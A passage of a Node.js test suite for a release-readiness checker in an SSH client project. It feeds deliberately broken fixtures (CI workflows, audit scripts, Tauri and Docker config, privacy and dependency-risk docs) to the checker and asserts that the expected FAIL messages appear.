});

test("rejects privacy docs that omit the runtime telemetry readiness wording", (t) => {
  const result = runChecker(
    createFixture(t, {
      "docs/privacy-public-beta.md":
        "opt-in SSH host username command path file name private key token terminal output\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Public Beta privacy note mentions 'runtime'/,
  );
  assert.match(
    result.stdout,
    /FAIL Privacy note documents runtime telemetry control evidence/,
  );
});

test("rejects Web Admin fixture data as the public default", (t) => {
  const result = runChecker(
    createFixture(t, {
      "apps/web/src/adminData.ts":
        "const params = new URLSearchParams(search);\nreturn params.get('adminSnapshot') === 'live' ? 'live' : 'fixture';\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Web Admin defaults to live admin snapshots unless fixture is explicit/,
  );
  assert.match(
    result.stdout,
    /FAIL Web Admin does not default public roots to fixture data/,
  );
});

test("rejects Web Admin live snapshot loaders without a response size cap", (t) => {
  const result = runChecker(
    createFixture(t, {
      "apps/web/src/adminData.ts":
        "const params = new URLSearchParams(search);\nreturn params.get('adminSnapshot') === 'fixture' ? 'fixture' : 'live';\nexport function getAdminSnapshotSourceDescriptor() { return { mode: 'live', snapshotUrl: '/api/admin/snapshot', source: 'live' }; }\nconst fixtureDescriptor = { mode: 'fixture', snapshotUrl: null, source: 'fixture' };\nreturn response.json();\n",
      "apps/web/src/adminData.test.ts":
        "getAdminSnapshotSourceDescriptor('?adminSnapshot=fixture')\ngetAdminSnapshotSourceDescriptor('?adminSnapshot=live')\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Web Admin live snapshot loader caps response bytes before JSON parsing/,
  );
  assert.match(
    result.stdout,
    /FAIL Web Admin tests cover oversized live snapshot body rejection/,
  );
});

test("rejects Web Admin proxy examples without an upstream response size cap", (t) => {
  const result = runChecker(
    createFixture(t, {
      "deploy/web-admin/node-admin-snapshot-proxy.mjs":
        "ATLASTERM_WEB_ADMIN_PROXY_ALLOW_PUBLIC_BIND ATLASTERM_WEB_ADMIN_PROXY_OPERATOR_TOKEN isAuthorizedBearer timingSafeEqual isLoopbackHost await upstreamResponse.text()\n",
      "scripts/smoke-web-admin-proxy.mjs":
        "assertPublicBindFailsClosed assertPublicBindRequiresOperatorToken assertPublicBindRequiresOperatorAuthorization ATLASTERM_WEB_ADMIN_PROXY_ALLOW_PUBLIC_BIND=1\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Web Admin proxy caps upstream admin snapshot response bytes before forwarding/,
  );
  assert.match(
    result.stdout,
    /FAIL Web Admin proxy smoke covers public-bind startup rejection, operator auth, and oversized upstream snapshots/,
  );
});

test("rejects missing Web Admin snapshot ops status surface", (t) => {
  const result = runChecker(
    createFixture(t, {
      "apps/web/src/main.tsx": appShellFixture("web").replace(
        "snapshotStatus",
        "snapshot-state",
      ),
      "apps/web/src/localization.ts":
        "const SHARED_MESSAGES = {}; return SHARED_MESSAGES[key];\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Web Admin UI surfaces snapshot health and refresh metadata/,
  );
  assert.match(
    result.stdout,
    /FAIL Web Admin localization includes snapshot ops status fallback copy/,
  );
});

test("rejects Desktop release metadata that drifts from Tauri config", (t) => {
  const result = runChecker(
    createFixture(t, {
      "docs/desktop-release-metadata.json": JSON.stringify({
        productName: "WrongSSH",
        identifier: "dev.atlasterm.other",
        publisher: "",
        copyright: "",
        category: "",
        bundleTargets: ["windows"],
        signingEvidence: {},
        linuxPackageTypes: [],
      }),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop release metadata productName matches Tauri config/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop release metadata identifier matches Tauri config/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop release metadata includes publisher/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop release metadata documents signing evidence environment variables/,
  );
});

test("rejects Windows MSI metadata that cannot package the current beta", (t) => {
  const result = runChecker(
    createFixture(t, {
      "apps/desktop/src-tauri/tauri.conf.json": JSON.stringify({
        productName: "JoeSSH",
        version: "0.1.0-beta.1",
        identifier: "dev.atlasterm.joessh",
        bundle: {
          active: true,
          targets: "all",
          icon: ["icons/icon.png", "icons/icon.ico", "icons/icon.icns"],
          windows: {
            wix: {
              version: "0.1.0-beta.1",
              upgradeCode: "changed-upgrade-code",
            },
          },
        },
        app: { windows: [{ label: "main" }] },
      }),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Tauri WiX version maps 0\.1\.0-beta\.1 to MSI-compatible 0\.1\.0\.1/,
  );
  assert.match(
    result.stdout,
    /FAIL Tauri WiX upgrade code is stable for JoeSSH/,
  );
});

test("rejects Desktop bundle config without platform-native icons", (t) => {
  const result = runChecker(
    createFixture(t, {
      "apps/desktop/src-tauri/tauri.conf.json": JSON.stringify({
        productName: "JoeSSH",
        version: "0.1.0-beta.1",
        identifier: "dev.atlasterm.joessh",
        bundle: {
          active: true,
          targets: "all",
          icon: ["icons/icon.png"],
          windows: {
            wix: {
              version: "0.1.0.1",
              upgradeCode: "c2a51a19-3ad8-5494-8c3e-6eb5d2e3e748",
            },
          },
        },
        app: { windows: [{ label: "main" }] },
      }),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Tauri bundle icon config covers Windows, macOS, and PNG targets/,
  );
});

test("rejects Desktop candidate tooling that can upload without verification", (t) => {
  const result = runChecker(
    createFixture(t, {
      "package.json": JSON.stringify({
        version: "0.1.0-beta.1",
        scripts: Object.fromEntries(
          releaseScriptNames.map((name) => [
            name,
            fixtureScriptValue(name, {
              "release:desktop:verify-candidate": "echo skipped",
            }),
          ]),
        ),
      }),
      "scripts/verify-desktop-candidate.mjs": "console.log('unchecked');\n",
      ".github/workflows/desktop-candidates.yml":
        "git rev-parse HEAD\n--source-commit\nactions/upload-artifact\nrelease:desktop:verify-candidate\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop candidate verification script uses the candidate verifier/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop candidate verifier binds non-release metadata, source, files, and checksums/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop candidate workflow verifies the checked-out commit before upload/,
  );
});

test("rejects Desktop checksum scripts that bypass release evidence packaging", (t) => {
  const result = runChecker(
    createFixture(t, {
      "package.json": JSON.stringify({
        version: "0.1.0-beta.1",
        scripts: Object.fromEntries(
          [
            "qa:release:public",
            "qa:prod-audit",
            "qa:lighthouse",
            "qa:rust-advisory",
            "qa:web-admin-proxy-smoke",
            "qa:web-admin-sync-topology-smoke",
            "qa:web-admin-sync-topology-release-smoke",
            "qa:e2e:web-real-sync",
            "qa:e2e:web-real-sync:fresh",
            "qa:sync:backup-restore-smoke",
            "qa:sync:config-guard-smoke",
            "qa:sync:self-hosted-smoke",
            "qa:sync:release-smoke",
            "qa:tauri",
            "test:desktop-release-package",
            "qa:desktop-release-package",
            "test:desktop-release-evidence",
            "qa:desktop-release-evidence",
            "test:web-release",
            "qa:web-release",
            "test:release-sbom",
            "test:release-publish-preflight",
            "test:release-provenance",
            "test:release-readiness",
            "test:web-admin-bundle-token-scan",
            "test:sync-release-package",
            "test:sync-release-evidence",
            "test:web-release-verify",
            "qa:release-sbom",
            "qa:release-publish-preflight",
            "qa:release-provenance",
            "qa:release-readiness",
            "qa:web-admin-bundle-token-scan",
            "qa:sync-release-package",
            "qa:sync-release-evidence",
            "qa:sync:release-backup-restore-smoke",
            "release:desktop:build",
            "release:desktop:package",
            "release:desktop:checksums",
            "release:desktop:verify-evidence",
            "release:desktop:draft",
            "release:publish-preflight",
            "release:provenance",
            "release:provenance:verify",
            "release:verify-checksums",
            "release:sbom",
            "release:sbom:verify",
            "release:sync",
            "release:web",
          ].map((name) => [
            name,
            fixtureScriptValue(name, {
              "release:desktop:checksums":
                "node scripts/generate-artifact-checksums.mjs --output reports/release/desktop/SHA256SUMS.txt apps/desktop/src-tauri/target/release/bundle",
            }),
          ]),
        ),
      }),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop checksum script uses release packaging evidence flow/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop checksum script does not bypass Desktop release evidence/,
  );
});

test("rejects release checksum gates that do not discover all staged manifests", (t) => {
  const result = runChecker(
    createFixture(t, {
      "package.json": JSON.stringify({
        version: "0.1.0-beta.1",
        scripts: Object.fromEntries(
          [
            "qa:release:public",
            "qa:prod-audit",
            "qa:lighthouse",
            "qa:rust-advisory",
            "qa:web-admin-proxy-smoke",
            "qa:web-admin-sync-topology-smoke",
            "qa:web-admin-sync-topology-release-smoke",
            "qa:e2e:web-real-sync",
            "qa:e2e:web-real-sync:fresh",
            "qa:sync:backup-restore-smoke",
            "qa:sync:config-guard-smoke",
            "qa:sync:self-hosted-smoke",
            "qa:sync:release-smoke",
            "qa:tauri",
            "test:desktop-release-package",
            "qa:desktop-release-package",
            "test:desktop-release-evidence",
            "qa:desktop-release-evidence",
            "test:web-release",
            "qa:web-release",
            "test:release-sbom",
            "test:release-publish-preflight",
            "test:release-provenance",
            "test:release-readiness",
            "test:web-admin-bundle-token-scan",
            "test:sync-release-package",
            "test:sync-release-evidence",
            "test:web-release-verify",
            "qa:release-sbom",
            "qa:release-publish-preflight",
            "qa:release-provenance",
            "qa:release-readiness",
            "qa:web-admin-bundle-token-scan",
            "qa:sync-release-package",
            "qa:sync-release-evidence",
            "qa:sync:release-backup-restore-smoke",
            "release:desktop:build",
            "release:desktop:package",
            "release:desktop:checksums",
            "release:desktop:verify-evidence",
            "release:desktop:draft",
            "release:publish-preflight",
            "release:provenance",
            "release:provenance:verify",
            "release:verify-checksums",
            "release:sbom",
            "release:sbom:verify",
            "release:sync",
            "release:web",
          ].map((name) => [
            name,
            fixtureScriptValue(name, {
              "release:verify-checksums":
                "node scripts/verify-artifact-checksums.mjs reports/release/desktop/SHA256SUMS.txt reports/release/web/SHA256SUMS.txt reports/release/sync/SHA256SUMS.txt reports/release/SBOM-SHA256SUMS.txt",
            }),
          ]),
        ),
      }),
      "scripts/release-publish-preflight.mjs":
        "Verify release Git checkout rev-parse --porcelain=v1 :(exclude)reports/release must point at HEAD for publish preflight verify-web-release-package.mjs verify-sync-release-evidence.mjs verify-artifact-checksums.mjs reports/release/desktop/SHA256SUMS.txt reports/release/web/SHA256SUMS.txt reports/release/sync/SHA256SUMS.txt reports/release/SBOM-SHA256SUMS.txt\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Release checksum script verifies all staged release checksum manifests/,
  );
  assert.match(
    result.stdout,
    /FAIL Publish preflight verifies all staged release checksum manifests/,
  );
});

test("rejects publish preflight scripts without release Git checks", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/release-publish-preflight.mjs":
        "verify-web-release-package.mjs verify-sync-release-evidence.mjs verify-artifact-checksums.mjs --all-release\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Publish preflight verifies healthy Git checkout, clean tree, and release tag/,
  );
});

test("rejects publish preflight scripts without staged Web Admin package verification", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/release-publish-preflight.mjs":
        "Verify release Git checkout rev-parse --porcelain=v1 :(exclude)reports/release must point at HEAD for publish preflight verify-sync-release-evidence.mjs verify-artifact-checksums.mjs --all-release\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Publish preflight verifies the staged Web Admin release package/,
  );
});

test("rejects publish preflight scripts without Sync evidence verification", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/release-publish-preflight.mjs":
        "Verify release Git checkout rev-parse --porcelain=v1 :(exclude)reports/release must point at HEAD for publish preflight verify-web-release-package.mjs verify-artifact-checksums.mjs --all-release\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Publish preflight verifies Sync packaged backup\/restore release evidence/,
  );
});

test("rejects publish preflight scripts without release provenance verification", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/release-publish-preflight.mjs":
        "Verify release Git checkout rev-parse --porcelain=v1 :(exclude)reports/release must point at HEAD for publish preflight verify-web-release-package.mjs verify-sync-release-evidence.mjs verify-artifact-checksums.mjs --all-release\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Publish preflight verifies release provenance/,
  );
});

for (const [name, from, to, failure] of [
  [
    "full npm blocking policy",
    "High or critical findings in the full npm audit block release.",
    "High or critical findings are documented.",
    "Dependency risk policy blocks release on full npm high or critical findings",
  ],
  [
    "both Rust locks policy",
    "Both Rust lockfiles must pass `cargo audit --deny warnings`.",
    "The root Rust lockfile must pass cargo audit.",
    "Dependency risk policy requires both Rust lockfiles to deny warnings",
  ],
  [
    "npm advisory link",
    "https://github.com/advisories/GHSA-aaaa-bbbb-cccc",
    "GHSA-aaaa-bbbb-cccc",
    "Unresolved npm risk rows include advisory links",
  ],
  [
    "Rust advisory link",
    "https://rustsec.org/advisories/RUSTSEC-2099-0001.html",
    "RUSTSEC-2099-0001",
    "Unresolved Rust risk rows include advisory links",
  ],
  [
    "npm impact and decision",
    "Resource exhaustion; release blocked.",
    "",
    "Unresolved npm risk rows include advisory links",
  ],
  [
    "npm owner",
    "Release maintainers: adopt a supported fix.",
    ": adopt a supported fix.",
    "Unresolved npm risk rows include advisory links",
  ],
  [
    "npm next action",
    "Release maintainers: adopt a supported fix.",
    "Release maintainers:",
    "Unresolved npm risk rows include advisory links",
  ],
]) {
  test(`rejects dependency register without ${name}`, (t) => {
    const result = runChecker(createFixture(t, {
      "docs/dependency-risk-register.md": dependencyRiskFixture().replace(from, to),
    }));

    assert.equal(result.status, 1);
    assert.ok(result.stdout.includes(`FAIL ${failure}`), result.stdout);
  });
}

test("accepts documented resolved dependency sections without stale advisory names", (t) => {
  const result = runChecker(createFixture(t, {
    "docs/dependency-risk-register.md": [
      "High or critical findings in the full npm audit block release.",
      "Both Rust lockfiles must pass `cargo audit --deny warnings`.",
      "## Unresolved npm findings",
      "No unresolved npm findings.",
      "## RustSec",
      "No unresolved RustSec findings.",
    ].join("\n"),
  }));

  assert.equal(result.status, 0, result.stdout + result.stderr);
});

for (const script of [
  "npm audit --omit=dev --audit-level=high && node scripts/check-dependency-risk-register.mjs",
  "npm audit --audit-level=high",
  "npm audit --audit-level=high || node scripts/check-dependency-risk-register.mjs",
]) {
  test(`rejects dependency QA bypass: ${script}`, (t) => {
    const root = createFixture(t);
    const packageJson = JSON.parse(readFileSync(join(root, "package.json"), "utf8"));
    packageJson.scripts["qa:prod-audit"] = script;
    writeFile(root, "package.json", JSON.stringify(packageJson));

    const result = runChecker(root);

    assert.equal(result.status, 1);
    assert.match(result.stdout, /FAIL Dependency QA runs the full npm high-severity gate before live risk-register validation/);
  });
}

test("rejects a no-op dependency risk-register regression script", (t) => {
  const root = createFixture(t);
  const packageJson = JSON.parse(readFileSync(join(root, "package.json"), "utf8"));
  packageJson.scripts["test:dependency-risk-register"] = "echo ok";
  writeFile(root, "package.json", JSON.stringify(packageJson));

  const result = runChecker(root);

  assert.equal(result.status, 1);
  assert.match(result.stdout, /FAIL Dependency risk-register regression script runs the owning test file/);
});

test("rejects CI with dependency risk-register regressions commented out", (t) => {
  const result = runChecker(createFixture(t, {
    ".github/workflows/ci.yml": ciFixture().replace(
      "      - run: npm run test:dependency-risk-register",
      "      # - run: npm run test:dependency-risk-register",
    ),
  }));

  assert.equal(result.status, 1);
  assert.match(result.stdout, /FAIL CI executes dependency risk-register regressions/);
});

for (const [name, script] of [
  ["missing native lockfile", "cargo audit --deny warnings"],
  [
    "missing root lockfile",
    "cargo audit --file apps/desktop/src-tauri/Cargo.lock --deny warnings",
  ],
  [
    "root warnings allowed",
    "cargo audit && cargo audit --file apps/desktop/src-tauri/Cargo.lock --deny warnings",
  ],
  [
    "native warnings allowed",
    "cargo audit --deny warnings && cargo audit --file apps/desktop/src-tauri/Cargo.lock",
  ],
  [
    "ignored root advisory",
    "cargo audit --deny warnings --ignore RUSTSEC-2024-0388 && cargo audit --file apps/desktop/src-tauri/Cargo.lock --deny warnings",
  ],
  [
    "ignored native advisory",
    "cargo audit --deny warnings && cargo audit --file apps/desktop/src-tauri/Cargo.lock --deny warnings --ignore RUSTSEC-2024-0388",
  ],
  [
    "native audit failure swallowed",
    "cargo audit --deny warnings && cargo audit --file apps/desktop/src-tauri/Cargo.lock --deny warnings || true",
  ],
  [
    "native audit only echoed",
    "cargo audit --deny warnings && echo cargo audit --file apps/desktop/src-tauri/Cargo.lock --deny warnings",
  ],
]) {
  test(`rejects Rust advisory script with ${name}`, (t) => {
    const root = createFixture(t);
    const packageJson = JSON.parse(readFileSync(join(root, "package.json"), "utf8"));
    packageJson.scripts["qa:rust-advisory"] = script;
    writeFile(root, "package.json", JSON.stringify(packageJson));

    const result = runChecker(root);

    assert.equal(result.status, 1);
    assert.match(
      result.stdout,
      /FAIL Rust advisory QA audits root and native lockfiles with warnings denied and no bypasses/,
    );
  });
}

for (const [name, mutate] of [
  [
    "native audit commented out",
    (ci) => ci.replace(
      "      - run: cargo audit --file",
      "      # - run: cargo audit --file",
    ),
  ],
  [
    "root audit commented out",
    (ci) => ci.replace(
      "      - run: cargo audit --deny warnings",
      "      # - run: cargo audit --deny warnings",
    ),
  ],
  [
    "native warnings allowed",
    (ci) => ci.replace(
      "Cargo.lock --deny warnings",
      "Cargo.lock",
    ),
  ],
  [
    "native advisory ignored",
    (ci) => ci.replace(
      "Cargo.lock --deny warnings",
      "Cargo.lock --deny warnings --ignore RUSTSEC-2024-0388",
    ),
  ],
  [
    "native audit failure swallowed",
    (ci) => ci.replace(
      "Cargo.lock --deny warnings",
      "Cargo.lock --deny warnings || true",
    ),
  ],
  [
    "native audit failure allowed",
    (ci) => `${ci}\n        continue-on-error: true`,
  ],
  [
    "native audit outside Rust job",
    (ci) => ci.replace(
      "      - run: cargo audit --file",
      "  optional-native-audit:\n    if: false\n    steps:\n      - run: cargo audit --file",
    ),
  ],
]) {
  test(`rejects CI Rust gate with ${name}`, (t) => {
    const result = runChecker(createFixture(t, {
      ".github/workflows/ci.yml": mutate(ciFixture()),
    }));

    assert.equal(result.status, 1);
    assert.match(
      result.stdout,
      /FAIL CI Rust (?:job runs 'cargo audit|audits deny warnings without ignores, skipped execution, or failure bypasses)/,
    );
  });
}

test("rejects public release scripts without Lighthouse release-machine gate", (t) => {
  const result = runChecker(
    createFixture(t, {
      "package.json": JSON.stringify({
        version: "0.1.0-beta.1",
        scripts: Object.fromEntries(
          releaseScriptNames.map((name) => [
            name,
            fixtureScriptValue(name, {
              "qa:release:public":
                "npm run qa:rust-advisory && npm run qa:web-admin-sync-topology-release-smoke",
            }),
          ]),
        ),
      }),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Public release QA runs Web Admin Lighthouse on the release machine/,
  );
});

test("rejects public release scripts without mobile public env gate", (t) => {
  const scripts = Object.fromEntries(
    releaseScriptNames.map((name) => [name, fixtureScriptValue(name)]),
  );
  scripts["qa:release:public"] =
    "npm run qa:rust-advisory && npm run qa:lighthouse && npm run qa:web-admin-sync-topology-release-smoke && npm run qa:sync:release-backup-restore-smoke && npm run qa:sync:backup-restore-smoke && node scripts/verify-sync-release-evidence.mjs";
  scripts["qa:release:public:local"] =
    "npm run qa:rust-advisory && npm run qa:lighthouse && npm run qa:web-admin-sync-topology-release-smoke && npm run qa:sync:release-backup-restore-smoke && npm run qa:sync:backup-restore-smoke && node scripts/verify-sync-release-evidence.mjs";

  const result = runChecker(
    createFixture(t, {
      "package.json": JSON.stringify({
        version: "0.1.0-beta.1",
        scripts,
      }),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Public release QA rejects mobile public bearer-token env/,
  );
  assert.match(
    result.stdout,
    /FAIL Local public release QA rejects mobile public bearer-token env/,
  );
});

test("rejects public release scripts that do not verify Sync release evidence after local smokes", (t) => {
  const scripts = Object.fromEntries(
    releaseScriptNames.map((name) => [name, fixtureScriptValue(name)]),
  );
  scripts["qa:release:public"] =
    "npm run qa:rust-advisory && npm run qa:lighthouse && npm run qa:web-admin-sync-topology-release-smoke && npm run qa:sync:release-backup-restore-smoke && node scripts/verify-sync-release-evidence.mjs && npm run qa:sync:backup-restore-smoke";
  scripts["qa:release:public:local"] =
    "npm run qa:rust-advisory && npm run qa:lighthouse && npm run qa:web-admin-sync-topology-release-smoke && npm run qa:sync:release-backup-restore-smoke && npm run qa:sync:backup-restore-smoke";
  const result = runChecker(
    createFixture(t, {
      "package.json": JSON.stringify({
        version: "0.1.0-beta.1",
        scripts,
      }),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Public release QA verifies Sync packaged release evidence after local Sync smokes/,
  );
  assert.match(
    result.stdout,
    /FAIL Local public release QA verifies Sync packaged release evidence after local Sync smokes/,
  );
});

test("rejects root QA scripts that use non-fresh E2E", (t) => {
  const result = runChecker(
    createFixture(t, {
      "package.json": JSON.stringify({
        version: "0.1.0-beta.1",
        scripts: Object.fromEntries(
          releaseScriptNames.map((name) => [
            name,
            fixtureScriptValue(name, {
              qa: "npm run lint && npm run qa:e2e",
            }),
          ]),
        ),
      }),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(result.stdout, /FAIL Root QA runs E2E on fresh local ports/);
  assert.match(result.stdout, /FAIL Root QA avoids non-fresh E2E server reuse/);
});

test("rejects CI E2E jobs that use non-fresh E2E", (t) => {
  const result = runChecker(
    createFixture(t, {
      ".github/workflows/ci.yml": ciFixture().replace(
        "npm run qa:e2e:fresh",
        "npm run qa:e2e",
      ),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL CI public release gate runs 'npm run qa:e2e:fresh'/,
  );
  assert.match(
    result.stdout,
    /FAIL CI E2E job avoids non-fresh E2E server reuse/,
  );
});

test("rejects release provenance tooling without Git and manifest binding", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/generate-release-provenance.mjs":
        "writeFileSync('reports/release/release-provenance.json', '{}')\n",
      "scripts/verify-release-provenance.mjs": "console.log('ok')\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Release provenance generator binds Git, lockfiles, manifests, and provenance checksum evidence/,
  );
  assert.match(
    result.stdout,
    /FAIL Release provenance verifier rejects stale Git, release notes, lockfile, manifest, and artifact evidence/,
  );
});

test("rejects Rust SSH dependencies that re-enable vulnerable RSA feature", (t) => {
  const result = runChecker(
    createFixture(t, {
      "crates/core/Cargo.toml":
        'russh = { version = "0.61", default-features = false, features = ["ring", "flate2", "rsa"] }\n',
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Rust SSH dependency keeps vulnerable RSA feature disabled for Public Beta/,
  );
});

test("rejects Desktop release package scripts that do not require all public platforms", (t) => {
  const result = runChecker(
    createFixture(t, {
      "package.json": JSON.stringify({
        version: "0.1.0-beta.1",
        scripts: Object.fromEntries(
          releaseScriptNames.map((name) => [
            name,
            fixtureScriptValue(name, {
              "release:desktop:package":
                "node scripts/package-desktop-release.mjs",
            }),
          ]),
        ),
      }),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop release package script requires Windows, macOS, and Linux artifacts by default/,
  );
});

test("rejects Desktop release evidence tooling without artifact hash binding", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/package-desktop-release.mjs":
        "createEvidenceEntry(path, classification)\n",
      "scripts/verify-desktop-release-evidence.mjs":
        "requireNonEmptyString(label, artifact, 'signatureVerification')\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop release packager records artifact SHA256 in release evidence/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop release evidence verifier recomputes artifact hashes from disk/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop release evidence verifier binds artifact SHA256 to the checksum manifest/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop release evidence verifier binds release evidence JSON to its checksum manifest/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop release evidence verifier binds signing proof text to artifact identity/,
  );
});

test("rejects release draft tooling that uploads raw Tauri bundle artifacts", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/create-github-release-draft.mjs":
        'const candidates = [resolve(root, "reports", "release"), resolve(root, "apps", "desktop", "src-tauri", "target", "release", "bundle")];\n',
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL GitHub Release draft uploads only staged reports\/release artifacts/,
  );
});

test("rejects narrow Web Admin bundle token scanners", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/check-web-admin-bundle-token-scan.mjs":
        "VITE_ATLASTERM_ADMIN_SNAPSHOT_AUTH_TOKEN atlasterm-admin-snapshot-sentinel-token\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Web Admin bundle token scan rejects token env names, bearer literals, and high-entropy credential literals/,
  );
});

test("rejects narrow mobile public env guards", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/check-mobile-public-env.mjs": "console.log('ok');\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Mobile public env guard rejects EXPO_PUBLIC sync auth tokens/,
  );
});

test("rejects Web Admin release packagers without output path guards", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/package-web-release.mjs":
        "writeFileSync(outputPath, archive);\nwriteFileSync(checksumPath, manifest);\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Web Admin release packager keeps output paths inside the release root/,
  );
});

test("rejects Sync release packagers without stale binary cleanup", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/package-sync-release.mjs":
        "copyFileSync(sourceBinary, releaseBinary);\nwriteFileSync(checksumPath, 'SHA256SUMS.txt');\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Sync release packager removes stale staged binaries while writing checksums/,
  );
});

test("rejects Sync backup/restore smokes without separated local and release evidence", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/smoke-sync-backup-restore.mjs": "binaryKind binarySha256\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Sync backup\/restore smoke separates local drill evidence from packaged release evidence/,
  );
});

test("rejects Lighthouse audit scripts without Web Admin release-machine evidence", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/lighthouse-audit.mjs":
        '"desktop" apps", "desktop", "dist reports", "lighthouse", "desktop.json defaultThresholds\n',
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Lighthouse release audit targets Web Admin dist, applies deployment headers, uses explicit fixture mode, serves a local admin snapshot fallback, fails on run warnings, and writes release-machine evidence/,
  );
});

test("rejects Web Admin topology smokes without staged Sync release binary support", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/smoke-web-admin-sync-release-topology.mjs":
        "assertWebDist startStaticReleaseServer node-admin-snapshot-proxy.mjs ATLASTERM_SYNC_CORS_ORIGINS assertTopologyEmptySnapshot seedSyncData /v1/devices/register /v1/sync/push assertTopologyPopulatedSnapshot activeMembers healthyDevices assertProxyReplacesBrowserAuthorization assertTopologyAdminTokenError\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Web Admin \+ Sync release topology smoke supports staged Sync release binary verification/,
  );
});

test("rejects Sync Dockerfiles without a container healthcheck", (t) => {
  const result = runChecker(
    createFixture(t, {
      "docs/self-hosting-sync.md":
        "ATLASTERM_SYNC_AUTH_TOKEN ATLASTERM_SYNC_METRICS_TOKEN ATLASTERM_SYNC_ALLOW_EPHEMERAL_STORAGE 32 characters /readyz /metrics schema_version: 1 qa:sync:config-guard-smoke ledger.lock joessh_sync_storage_write_failures_total qa:sync:backup-restore-smoke RPO RTO systemd Docker Authorization: Bearer ${ATLASTERM_SYNC_METRICS_TOKEN} qa:sync-release-package qa:sync:release-smoke\n",
      "services/sync/Dockerfile":
        'ENV ATLASTERM_SYNC_STORAGE_PATH=/var/lib/joessh-sync/ledger.json\nVOLUME ["/var/lib/joessh-sync"]\n',
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Sync self-hosting guide mentions 'HEALTHCHECK'/,
  );
  assert.match(
    result.stdout,
    /FAIL Sync service Dockerfile declares a container healthcheck/,
  );
});

test("rejects self-hosting metrics restore docs without metrics token auth", (t) => {
  const result = runChecker(
    createFixture(t, {
      "docs/self-hosting-sync.md":
        "ATLASTERM_SYNC_AUTH_TOKEN ATLASTERM_SYNC_METRICS_TOKEN ATLASTERM_SYNC_ALLOW_EPHEMERAL_STORAGE 32 characters /readyz /metrics schema_version: 1 qa:sync:config-guard-smoke ledger.lock joessh_sync_storage_write_failures_total qa:sync:backup-restore-smoke RPO RTO systemd Docker HEALTHCHECK qa:sync-release-package qa:sync:release-smoke\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Sync self-hosting guide mentions 'Authorization: Bearer \$\{ATLASTERM_SYNC_METRICS_TOKEN\}'/,
  );
});

test("rejects missing repository release handoff playbook", (t) => {
  const result = runChecker(
    createFixture(t, {
      "docs/repository-release-handoff.md": "",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
